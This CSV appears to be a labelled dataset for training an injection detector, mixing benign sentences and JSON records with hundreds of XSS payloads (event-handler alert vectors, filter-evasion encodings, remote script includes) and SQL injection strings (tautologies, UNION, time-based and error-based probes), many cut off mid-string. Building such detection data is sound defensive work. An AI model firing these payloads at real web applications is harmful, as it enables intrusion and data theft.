Payload,Label,text_label,ID
"{""id"":null,""name"":""Ekans""}",0,normal,26848
"<option onmouseout=""alert(1)"">test</option>",1,XSS,6996
I'm thinking of where to go for relaxation.,0,normal,23706
Create blog.,0,normal,23080
1' ) where 6045 = 6045,2,SQLi,15115
"{""id"":null,""firstName"":""Jolene"",""lastName"":""Lee"",""",0,normal,26878
"<main onmouseenter=""alert(1)"">test</main>",1,XSS,5340
1' ) as pkis where 3446 = 3446 or 2633 = dbms_pipe,2,SQLi,18700
"<body onkeyup body onkeyup=""javascript:javascript:",1,XSS,409
"<bdi draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,8352
Where's the perfect place to take a photography cl,0,normal,23969
"{""id"":null,""firstName"":""Aimi"",""lastName"":""Linah"",""",0,normal,27479
"-3109"" or elt ( 1032 = 1032,3623 )",2,SQLi,18426
select case when 3076 = 1605 then 1 else null end-,2,SQLi,13249
1 ) ) as uqsi where 1644 = 1644 and 9198 = 9198--,2,SQLi,15208
1%' and 4595 = 4595#,2,SQLi,12138
create user name identified by 'pass123',2,SQLi,11127
"{""id"":null,""firstName"":""Petrina"",""lastName"":""Ngo"",",0,normal,27159
"<xmp onbeforepaste=""alert(1)"" contenteditable>test",1,XSS,6111
<div style=width:1px;filter:glow onfilterchange=ja,1,XSS,644
)alert(1);//,1,XSS,1717
1'+ ( select 'vnue' where 5807 = 5807,2,SQLi,14421
Join hike.,0,normal,23044
"<a style=""pointer-events:none;position:absolute;"">",1,XSS,698
"1"" ) and ( select 9067 from ( select count ( * ) ,",2,SQLi,17173
"<tt onclick=""alert(1)"">test</tt>",1,XSS,8944
Where's the esthetician?,0,normal,23645
-2751 where 6334 = 6334 or ( 9668 = 5845 ) *5845--,2,SQLi,20994
"select sleep ( 5 ) and ( ( ( ""wucy"" like ""wucy",2,SQLi,13738
<body onpointerdown=alert(1)>XSS</body>,1,XSS,6318
) or sleep(__TIME__)=,2,SQLi,10121
<xss id=x tabindex=1 ondeactivate=alert(1)></xss><,1,XSS,2087
"<style>@keyframes slidein {}</style><tt style=""ani",1,XSS,8913
<col id=x tabindex=1 onbeforeactivate=alert(1)></c,1,XSS,3413
23 OR 1 = 1,2,SQLi,11958
"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ",2,SQLi,14650
1 ) where 4479 = 4479 rlike ( select ( case when (,2,SQLi,14614
"1"" ) where 1705 = 1705",2,SQLi,21150
"admin""/*",2,SQLi,9925
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,16292
waitfor delay '0:0:5'#,2,SQLi,21272
<dir id=x tabindex=1 onbeforedeactivate=alert(1)><,1,XSS,7903
Update the software version.,0,normal,22634
"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642",2,SQLi,16138
Filter junk.,0,normal,23056
"The lowest amount I could select was $150, the lar",0,normal,25414
"<nav onpaste=""alert(1)"" contenteditable>test</nav>",1,XSS,3319
"<progress oncontextmenu=""alert(1)"">test</progress>",1,XSS,7927
Select love.,0,normal,24740
"select count ( * ) from generate_series ( 1,500000",2,SQLi,15774
"<center onmouseenter=""alert(1)"">test</center>",1,XSS,4006
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,2,SQLi,10375
)) RLIKE SLEEP(5) AND (('1337' LIKE '1337,2,SQLi,11230
"<dd draggable=""true"" ondragend=""alert(1)"">test</dd",1,XSS,5579
"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171",2,SQLi,12531
"1"" ) where 7452 = 7452",2,SQLi,19008
select,0,normal,26573
"<;SCRIPT/XSS SRC="";http://ha.ckers.org/xss.js"";>;<",1,XSS,1651
"<listing onmouseout=""alert(1)"">test</listing>",1,XSS,2853
Greater London (in the sense in which that name mi,0,normal,26131
select sleep ( 5 ) and ( 'dcys' like 'dcys,2,SQLi,12863
1'+ ( select wpkh where 5842 = 5842,2,SQLi,20581
<abbr onpointerdown=alert(1)>XSS</abbr>,1,XSS,4232
1,0,normal,26645
"1"" or 1022 = ( select count ( * ) from all_users t",2,SQLi,15412
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,2,SQLi,10376
"<li oncontextmenu=""alert(1)"">test</li>",1,XSS,3421
Where's the hotel?,0,normal,23546
"1"" ) where 4739 = 4739 or ( select 2* ( if ( ( sel",2,SQLi,14275
"-3562"" ) as eghl where 7094 = 7094 union all selec",2,SQLi,14354
1 ) ) as xbii where 2262 = 2262 or sleep ( 5 ) --,2,SQLi,18647
1'+ ( select bfeq where 3445 = 3445 and 9198 = 919,2,SQLi,21942
"</TITLE><SCRIPT>alert("""");</SCRIPT>",1,XSS,7734
"<img src=x onerror=\x32""javascript:alert(1)"">",1,XSS,682
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,16397
"<link onmouseenter=""alert(1)"">test</link>",1,XSS,4208
"1%' and elt ( 3114 = 3114,sleep ( 5 ) ) #",2,SQLi,20563
<a onpointerenter=alert(1)>XSS</a>,1,XSS,6709
"<iframe draggable=""true"" ondragstart=""alert(1)"">te",1,XSS,2254
Select the best wedding videographer.,0,normal,24383
1' ) ) as bbdf where 1327 = 1327,2,SQLi,16748
Where's the perfect spot to unwind?,0,normal,23936
"1"" ) ) ) or 7417 = ( select count ( * ) from sysib",2,SQLi,21910
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt,1,XSS,1450
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,3108
Select a color scheme for the website.,0,normal,24151
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,20741
javascript:/*--></title></style></template></noscr,1,XSS,9538
"<a href=""\xE2\x80\x83javascript:javascript:alert(1",1,XSS,519
"<noframes draggable=""true"" ondrag=""alert(1)"">test<",1,XSS,6815
"&lt;XML ID=\""xss\""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SR",1,XSS,1025
"You select a unit with the right trigger, select w",0,normal,25058
"1"" ) as doai where 7024 = 7024 union all select nu",2,SQLi,17143
I'm considering where to have a family picnic.,0,normal,23674
"{""id"":null,""firstName"":""Eddy"",""lastName"":""Ham"",""sp",0,normal,27600
ORDER BY 17,2,SQLi,10321
1 where 1519 = 1519,2,SQLi,17783
select ( case when ( 9246 = 6326 ) then 9246 else ,2,SQLi,16343
"When buying navel oranges, select those with small",0,normal,25159
min,0,normal,23143
"1"" ) ) ) and 3754 = ( select upper ( xmltype ( chr",2,SQLi,21025
"select * from users where id = 1 or "".["" or 1 = 1 ",2,SQLi,11700
1'+ ( select wpbj where 1849 = 1849,2,SQLi,19805
I want to choose a restaurant for dinner.,0,normal,23701
"<sub onmouseup=""alert(1)"">test</sub>",1,XSS,2142
1' ) where 1804 = 1804 procedure analyse ( extract,2,SQLi,18729
"<bgsound draggable=""true"" ondrag=""alert(1)"">test</",1,XSS,4845
1' ) ) ) order by 1#,2,SQLi,13137
"<ins onkeydown=""alert(1)"" contenteditable>test</in",1,XSS,5160
"1' ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7",2,SQLi,19133
schema,0,normal,23173
Where's the best spot to do some birdwatching?,0,normal,23688
"<acronym oncopy=""alert(1)"" contenteditable>test</a",1,XSS,8682
"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( ch",2,SQLi,18901
Select a hiking trail to hike.,0,normal,24232
"1 ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a47",2,SQLi,15687
"hi or 1 = 1 --""",2,SQLi,11610
"1%"" union all select null,null,null,null,null#",2,SQLi,12426
"-5755"" or 3581 = 7566",2,SQLi,21579
"<a href=""javascript%26colon;alert(1)"">click",1,XSS,9570
"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exe",1,XSS,9017
<style>:target {color:red;}</style><input id=x sty,1,XSS,4310
select * from users where id = 1 %$ . or 1 = 1 -- ,2,SQLi,11971
&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&qu,1,XSS,1400
1' in boolean mode ) or char ( 75 ) ||char ( 70 ) ,2,SQLi,13918
Where is your data?,0,normal,23435
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,21958
1'|| ( select 'rjis' from dual where 7696 = 7696 a,2,SQLi,20948
1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ,2,SQLi,16814
"-3856"" ) as iyzl where 7394 = 7394 or 1570 = conve",2,SQLi,14404
"select * from users where id = 1 or 1#"", union sel",2,SQLi,12035
"<style>@keyframes x{}</style><em style=""animation-",1,XSS,2222
<wbr onpointerover=alert(1)>XSS</wbr>,1,XSS,3795
"1%' ) ) union all select null,null--",2,SQLi,21946
ORDER BY 15--,2,SQLi,10257
"<menuitem onbeforecut=""alert(1)"" contenteditable>t",1,XSS,5891
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCR",1,XSS,7259
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');""",1,XSS,269
"<article onclick=""alert(1)"">test</article>",1,XSS,2679
-2233' or ( 1807 = 7274 ) *7274,2,SQLi,16856
<colgroup onpointerdown=alert(1)>XSS</colgroup>,1,XSS,5163
"{""id"":null,""name"":""Birdramon""}",0,normal,27535
Locate items where needed.,0,normal,23364
-7387' ) ) ) order by 1--,2,SQLi,20574
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,15020
Join the cause.,0,normal,22843
"1"" where 7380 = 7380 or 9643 = ( select count ( * ",2,SQLi,13757
"1%' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( c",2,SQLi,21874
<style>:target {transform: rotate(180deg);}</style,1,XSS,8607
"iif ( 6369 = 5881,1,1/0 )",2,SQLi,19806
"OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000",2,SQLi,10416
))) RLIKE SLEEP(5) AND (((1337=1337,2,SQLi,11217
<input onfocus=javascript:alert(1) autofocus>,1,XSS,618
"-7939"" ) or 3958 = 6909",2,SQLi,18986
<body onscroll=javascript:alert(1)><br><br><br><br,1,XSS,777
"-1647' ) ) union all select 3030,3030,3030,3030,30",2,SQLi,16014
select dbms_pipe.receive_message ( chr ( 66 ) ||ch,2,SQLi,19397
<table id=x tabindex=1 onfocusin=alert(1)></table>,1,XSS,7226
<script id=x tabindex=1 onfocusin=alert(1)></scrip,1,XSS,7889
1' ) ) and ( select * from ( select ( sleep ( 5 ) ,2,SQLi,15648
<code onblur=alert(1) tabindex=1 id=x></code><inpu,1,XSS,7434
"<style>@keyframes x{}</style><footer style=""animat",1,XSS,3184
1' ) ) as jzoh where 6484 = 6484 and 7364 = 4233--,2,SQLi,14527
"iif ( 1483 = 7301,1,1/0 )",2,SQLi,21838
default,0,normal,23178
"select * from generate_series ( 7754,7754,case whe",2,SQLi,20090
"<link draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,7609
"-4025"" or 3038 = 3038",2,SQLi,20435
"-5998%"" ) union all select 2366,2366,2366,2366#",2,SQLi,14253
<strike onpointerdown=alert(1)>XSS</strike>,1,XSS,6676
>/XaDoS/><script>alert(document.cookie)</script><s,1,XSS,1339
"g'""></IFRAME>Hover the cursor to the LEFT of this ",1,XSS,1249
<param onpointerover=alert(1)>XSS</param>,1,XSS,4551
1,0,normal,26678
"<style>@keyframes x{}</style><frameset style=""anim",1,XSS,6652
"-8929%' ) union all select 9486,9486,9486,9486#",2,SQLi,13748
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10782
"<summary draggable=""true"" ondrag=""alert(1)"">test</",1,XSS,6115
1'+ ( select wgmn where 4368 = 4368 and 7859 = 615,2,SQLi,12517
<svg><noscript onload=alert(1)></noscript>,1,XSS,5714
"</svg>//[""'`-->]]>]</div>",1,XSS,9036
<dialog onpointerover=alert(1)>XSS</dialog>,1,XSS,7754
"1"" and sleep ( 5 )",2,SQLi,17675
Select the right shade of lipstick.,0,normal,24093
"{""id"":null,""firstName"":""Chong Lew"",""lastName"":""Teo",0,normal,27539
"<IMG SRC=x onmouseup=""alert(String.fromCharCode(88",1,XSS,1204
"{""id"":null,""name"":""name spell""}",0,normal,27476
"admin"" or ""1"" = ""1",2,SQLi,11831
if ( 5316 = 4416 ) select 5316 else drop function ,2,SQLi,20273
<caption id=x tabindex=1 onbeforeactivate=alert(1),1,XSS,3397
Let's discuss where to travel next summer.,0,normal,23978
"From the mass thrown out by the blast, or loosened",0,normal,26158
"<s onmouseout=""alert(1)"">test</s>",1,XSS,7642
"<rp oncontextmenu=""alert(1)"">test</rp>",1,XSS,4813
"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",2,SQLi,17336
"<meter onmouseenter=""alert(1)"">test</meter>",1,XSS,8344
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10548
<style>:target {transform: rotate(180deg);}</style,1,XSS,7073
It was not an easy process to select the winners.,0,normal,25950
"select count ( * ) from generate_series ( 1,500000",2,SQLi,16804
-9487 ) ) as rvck where 9404 = 9404 or make_set ( ,2,SQLi,22208
"<style>@keyframes x{}</style><link style=""animatio",1,XSS,5367
<embed onpointermove=alert(1)>XSS</embed>,1,XSS,3462
<tfoot onpointerout=alert(1)>XSS</tfoot>,1,XSS,2501
"]-(SELECT 0 WHERE 1337=1337 AND ELT(1337=1337,SLEE",2,SQLi,11268
<footer onblur=alert(1) tabindex=1 id=x></footer><,1,XSS,5955
"-7111%"" union all select 6083,6083,6083,6083,6083,",2,SQLi,16326
1' in boolean mode ) and 3715 in ( ( char ( 113 ) ,2,SQLi,13705
<img src='1' onerror/=alert(0) />,1,XSS,9713
<rt onpointerenter=alert(1)>XSS</rt>,1,XSS,8236
"1%' ) ) procedure analyse ( extractvalue ( 9255,co",2,SQLi,12935
"<dialog onmouseup=""alert(1)"">test</dialog>",1,XSS,4339
"-5496 union all select 2099,2099,2099#",2,SQLi,19706
"1"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ",2,SQLi,13612
"<dir onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,7406
We've also included the Dow's return and select fo,0,normal,25166
""" or pg_sleep ( __TIME__ ) --",2,SQLi,11372
Select connive.,0,normal,24749
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10427
1 ) ) as pxmz where 2596 = 2596,2,SQLi,20766
"{""id"":null,""firstName"":""Emy"",""lastName"":""Sahprudin",0,normal,27179
( select ( case when ( 1343 = 1343 ) then ( select,2,SQLi,21227
&&SLEEP(5)--,2,SQLi,10400
1 ) ) rlike sleep ( 5 ) and ( ( 8773 = 8773,2,SQLi,14621
select * from users where id = 1 or ( \+ ) = 1 uni,2,SQLi,12041
Let's choose a destination for our next vacation.,0,normal,23921
1 ) as czeu where 1738 = 1738 or exp ( ~ ( select ,2,SQLi,14405
<style>:target {transform: rotate(180deg);}</style,1,XSS,4528
Where did you find that calming garden?,0,normal,23912
"1"" ) ) as fapw where 4722 = 4722 union all select ",2,SQLi,21374
"-1947 union all select 7780,7780,7780,7780,7780,77",2,SQLi,19522
<svg><bdi onload=alert(1)></bdi>,1,XSS,2735
"<font draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,6129
"-4694%"" ) ) ) union all select 9178,9178,9178,9178",2,SQLi,18897
1'|| ( select 'sliy' where 9494 = 9494,2,SQLi,20355
"src=http://www.site.com/XSS.js""></script>",1,XSS,1341
<ol onpointerover=alert(1)>XSS</ol>,1,XSS,2383
1 and 2620 = 2175,2,SQLi,18995
1 or 5286 = ( select count ( * ) from all_users t1,2,SQLi,12590
ORDER BY 7--,2,SQLi,10249
"When you select that, green dots float around the ",0,normal,25142
1'|| ( select 'vwmg' where 7928 = 7928,2,SQLi,18826
"1"" ) as nfpe where 2679 = 2679",2,SQLi,17545
-8131' ) ) or 9680 = 3467,2,SQLi,13397
"1%"" or 7427 = dbms_pipe.receive_message ( chr ( 11",2,SQLi,22322
"A select guide to cultural events for children, te",0,normal,26417
Its most important early charter was that granted ,0,normal,25940
"<a href=""javas\x00cript:javascript:alert(1)"" id=""f",1,XSS,9062
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) y",2,SQLi,20513
<style>:target {color: red;}</style><ins id=x styl,1,XSS,5084
"<kbd draggable=""true"" ondragenter=""alert(1)"">test<",1,XSS,4824
1%' ) ) and sleep ( 5 ) and ( ( '%' = ',2,SQLi,17639
"""Donald Trump Won Because of Facebook,"" the blog S",0,normal,26462
`>ABC<div style=font-family:'foo'\x3Bx:expression(,1,XSS,451
"<body onmousedown=""alert(1)"">test</body>",1,XSS,5029
"<meta ondblclick=""alert(1)"">test</meta>",1,XSS,8738
1' in boolean mode ) or 2633 = dbms_pipe.receive_m,2,SQLi,19498
"<source draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,5097
<svg><u onload=alert(1)></u>,1,XSS,4937
"<button onmouseenter=""alert(1)"">test</button>",1,XSS,5814
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10611
<custom tags onpointerover=alert(1)>XSS</custom ta,1,XSS,5089
"<tr onmouseenter=""alert(1)"">test</tr>",1,XSS,3735
"<del onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,5008
"-6333"" ) ) ) union all select 9851,9851,9851,9851,",2,SQLi,12420
1' ) ) and 8514 = ( select count ( * ) from domain,2,SQLi,22267
1' ) ) ) and 9660 = ( select count ( * ) from all_,2,SQLi,19286
"<canvas onkeyup=""alert(1)"" contenteditable>test</c",1,XSS,5353
<dt id=x tabindex=1 ondeactivate=alert(1)></dt><in,1,XSS,3697
"<p onmouseout=""alert(1)"">test</p>",1,XSS,4699
<xss id=x tabindex=1 onfocus=alert(1)></xss>,1,XSS,3707
1,0,normal,26718
"Abstraction differs from Analysis, inasmuch as its",0,normal,26414
I'm thinking of where to attend a workshop.,0,normal,23844
<big id=x tabindex=1 onfocus=alert(1)></big>,1,XSS,7419
1%' ) ) ) or 2367 = ( select count ( * ) from rdb$,2,SQLi,17798
"exp/*<A STYLE='no\xss:noxss(""*//*""); xss:ex/*XSS*/",1,XSS,279
1%' ) and 3707 = ( select count ( * ) from sysibm.,2,SQLi,17521
"1' ) and row ( 6237,7469 ) > ( select count ( * ) ",2,SQLi,15171
<style>:target {color:red;}</style><blink id=x sty,1,XSS,4921
"-6636' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( (",2,SQLi,17537
Where's the massage therapist?,0,normal,23646
"1%' ) union all select null,null,null,null,null,nu",2,SQLi,18098
1'|| ( select 'hfbt' where 7204 = 7204 union all s,2,SQLi,15295
"<bdi oncontextmenu=""alert(1)"">test</bdi>",1,XSS,5526
"select * from users where id = 1 union select @ _,",2,SQLi,11836
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2303
"{""id"":null,""firstName"":""ÃÂ¥ÃÂ¿Ã¢â¬âÃÂ¦ÃÂºÃÂ"",""lastName"":",0,normal,27041
"-8599 ) ) or elt ( 5628 = 2324,2324 ) and ( ( 1134",2,SQLi,22130
"1 ) where 9206 = 9206 union all select null,null,n",2,SQLi,14657
1 ) where 8616 = 8616 and 2006 = 2006,2,SQLi,20825
AND 1 = utl_inaddr.get_host_address ( ( SELECT DIS,2,SQLi,11970
"or 1""=""1""#",2,SQLi,9990
<IMG SRC=ï¿½jav ascript:alert(ï¿½XSSï¿½);ï¿½>,1,XSS,1722
1' and 6621 = 4681--,2,SQLi,20464
"{""id"":null,""firstName"":""Ong"",""lastName"":""Yn"",""addr",0,normal,27303
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2113
"<font draggable=""true"" ondragstart=""alert(1)"">test",1,XSS,8881
<strong onpointerover=alert(1)>XSS</strong>,1,XSS,8025
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6488
"<optgroup draggable=""true"" ondragenter=""alert(1)"">",1,XSS,8589
<meter id=x tabindex=1 ondeactivate=alert(1)></met,1,XSS,5190
"{""id"":null,""firstName"":""Goh"",""lastName"":""Lai Chee""",0,normal,27033
<svg onfocusout=alert(1) tabindex=1 id=x></svg><in,1,XSS,7785
"1 where 1326 = 1326 union all select null,null,nul",2,SQLi,16472
"1"" ) ) ) procedure analyse ( extractvalue ( 5840,c",2,SQLi,15634
"<shadow onkeyup=""alert(1)"" contenteditable>test</s",1,XSS,7675
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script,1,XSS,684
"select pg_sleep ( 5 ) and ( ( ""byhx"" like ""byhx",2,SQLi,20225
"<hgroup oncontextmenu=""alert(1)"">test</hgroup>",1,XSS,6198
"-7272"" ) union all select 9163,9163,9163,9163,9163",2,SQLi,12911
"1' ) where 6988 = 6988 union all select null,null,",2,SQLi,19563
select * from users where id = 1 or $<\ union sele,2,SQLi,11819
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;jav,1,XSS,1407
Create a captivating poem.,0,normal,22695
"1%"" ) ) procedure analyse ( extractvalue ( 9627,co",2,SQLi,21649
1 where 3737 = 3737 or 4915 = ( select count ( * ),2,SQLi,21833
1' and 9970 = 3409,2,SQLi,13892
"{""id"":null,""firstName"":""Steleven"",""lastName"":""Ang""",0,normal,27018
"<img\x13src=x onerror=""javascript:alert(1)"">",1,XSS,658
<output onpointerup=alert(1)>XSS</output>,1,XSS,3550
select ( case when ( 7852 = 7476 ) then 7852 else ,2,SQLi,15239
"admin"" or 1 = 1#",2,SQLi,11420
"{""id"":null,""name"":""Ducklett""}",0,normal,27343
<applet onfocusout=alert(1) tabindex=1 id=x></appl,1,XSS,2714
"1, ( select ( case when ( 3888 = 3888 ) then ( sel",2,SQLi,12384
"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058",1,XSS,983
1'+ ( select aqhj where 4419 = 4419,2,SQLi,14466
"{""id"":null,""name"":""hung""}",0,normal,26822
"1"" or elt ( 5873 = 5873,sleep ( 5 ) ) #",2,SQLi,14702
"1%"" ) ) and 8594 = ( select 8594 from pg_sleep ( 5",2,SQLi,12151
<iframe src=%22404%22 onload=%22frames[0].document,1,XSS,9197
1%' ) ) ) or 8315 = ( select count ( * ) from sysi,2,SQLi,20373
"1%' ) ) ) and elt ( 7425 = 3843,3843 ) and ( ( ( '",2,SQLi,13936
"1"" ) where 8588 = 8588",2,SQLi,21178
><img src=x onerror=prompt(1);>,1,XSS,8959
<input onfocusout=alert(1) id=x><input autofocus>,1,XSS,7671
"1' ) union all select null,null#",2,SQLi,16098
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,1,XSS,2867
1 ) as zzip where 5353 = 5353 and 3394 = 3092,2,SQLi,12757
1'+ ( select 'drqj' where 1246 = 1246,2,SQLi,21158
In1831-1832he was select preacher before the Unive,0,normal,25988
The Primary Consideration In The Definition Of A U,0,normal,25389
"1 ) where 9645 = 9645 union all select null,null,n",2,SQLi,15671
"select * from users where id = 1 or 1#""? union sel",2,SQLi,11569
"1%' ) union all select null,null,null,null,null,nu",2,SQLi,13050
1,0,normal,26662
Select a quote for motivation.,0,normal,24186
"{""id"":null,""name"":""dance""}",0,normal,27393
"<IMG SRC=x onpaste=""alert(String.fromCharCode(88,8",1,XSS,1217
-2397 ) ) as oizy where 1746 = 1746 union all sele,2,SQLi,12997
"1"" ) as wehx where 5744 = 5744",2,SQLi,19202
"1"" ) and 6510 = ( select count ( * ) from sysusers",2,SQLi,14381
""" or """"*""",2,SQLi,11609
"<a href=""javas\x09cript:javascript:alert(1)"" id=""f",1,XSS,440
<td onpointerenter=alert(1)>XSS</td>,1,XSS,5022
"-6457 where 1764 = 1764 union all select 1764,1764",2,SQLi,21607
"1' ) union all select null,null,null,null--",2,SQLi,14300
1' ) where 3255 = 3255 or char ( 119 ) ||char ( 10,2,SQLi,21043
"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr",2,SQLi,13036
<dt onpointerleave=alert(1)>XSS</dt>,1,XSS,6071
"<script>Object.prototype.url = 'data:,alert(1)//' ",1,XSS,222
"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( ",2,SQLi,16266
"1' ) ) union all select null,null,null,null,null,n",2,SQLi,15775
<button onMouseEnter=javascript:alert(1)>,1,XSS,9632
Extra 20% off select items with code SAVER (throug,0,normal,26202
"0\""autofocus/onfocus=alert(1)--><video/poster/ err",1,XSS,1158
Penney has also struggled to select the right asso,0,normal,25786
"-1859' union all select 1781,1781,1781,1781#",2,SQLi,16514
"1"" ) ) ) union all select null,null,null#",2,SQLi,17738
"The president of the republic, Kruger, however, ha",0,normal,25391
"<sup oncontextmenu=""alert(1)"">test</sup>",1,XSS,4960
"1"" where 5250 = 5250",2,SQLi,15847
<style>@keyframes slidein {}</style><legend style=,1,XSS,8226
"1"" ) ) as ufba where 4049 = 4049",2,SQLi,12802
"1' where 5786 = 5786 and elt ( 1210 = 1210,sleep (",2,SQLi,21300
-8112' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ,2,SQLi,15954
"<code draggable=""true"" ondragend=""alert(1)"">test</",1,XSS,3052
1 where 6221 = 6221 and 9254 = ( select count ( * ,2,SQLi,15965
"1"" or 4411 = ( select count ( * ) from sysusers as",2,SQLi,21416
)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) A,2,SQLi,11201
1' in boolean mode ) and 8312 = dbms_pipe.receive_,2,SQLi,22285
"select * from users where id = 1 or ""1["" or 1 = 1 ",2,SQLi,11866
<shadow onpointerdown=alert(1)>XSS</shadow>,1,XSS,2097
"<element draggable=""true"" ondragenter=""alert(1)"">t",1,XSS,6744
", exec ( 'sel' + 'ect us' + 'er' )",2,SQLi,11722
"select * from users where id = 1 union select !<1,",2,SQLi,11577
1%' ) and 2716 = ( select count ( * ) from sysuser,2,SQLi,14226
&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&qu,1,XSS,1435
I want to select a gift for the special occasion.,0,normal,23979
<style>:target {transform: rotate(180deg);}</style,1,XSS,7325
Select perform.,0,normal,24722
Select trade.,0,normal,24768
<SCRIPT SRC=//xss.rocks/.j>,1,XSS,265
"<abbr onmouseout=""alert(1)"">test</abbr>",1,XSS,6322
"javascript:""/*\""/*'/*`/*--></noembed></template></",1,XSS,9511
"select count ( * ) from domain.domains as t1,domai",2,SQLi,18066
"<img src=1 href=1 onerror=""javascript:alert(1)""></",1,XSS,362
-5116 ) or ( 8287 = 4930 ) *4930,2,SQLi,22361
1 and 2006 = 2006,2,SQLi,22296
1' or ( select 2* ( if ( ( select * from ( select ,2,SQLi,14276
"<body oncut=""alert(1)"" contenteditable>test</body>",1,XSS,3401
"<option oncopy=""alert(1)"" contenteditable>test</op",1,XSS,6928
"-8353' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, (",2,SQLi,21601
"{""id"":null,""name"":""Syakomon""}",0,normal,26953
1 ) ) as ogcv where 4396 = 4396,2,SQLi,17321
<li id=x tabindex=1 onbeforeactivate=alert(1)></li,1,XSS,2229
"-3884"" where 8012 = 8012 union all select 8012,801",2,SQLi,13617
Select explore.,0,normal,24652
select * from users where id = '1' + $ . union sel,2,SQLi,11690
";alert(String.fromCharCode(88,83,83))//';alert(Str",1,XSS,9561
"You can select movies, TV shows or both, select a ",0,normal,25081
-5291' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash,2,SQLi,14188
"<ins ondblclick=""alert(1)"">test</ins>",1,XSS,5417
<strong id=x tabindex=1 onfocusin=alert(1)></stron,1,XSS,2152
"-5043%' ) ) ) union all select 5860,5860,5860,5860",2,SQLi,15311
"<nextid draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,4008
1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ),2,SQLi,21507
"<input onmouseleave=""alert(1)"">test</input>",1,XSS,2962
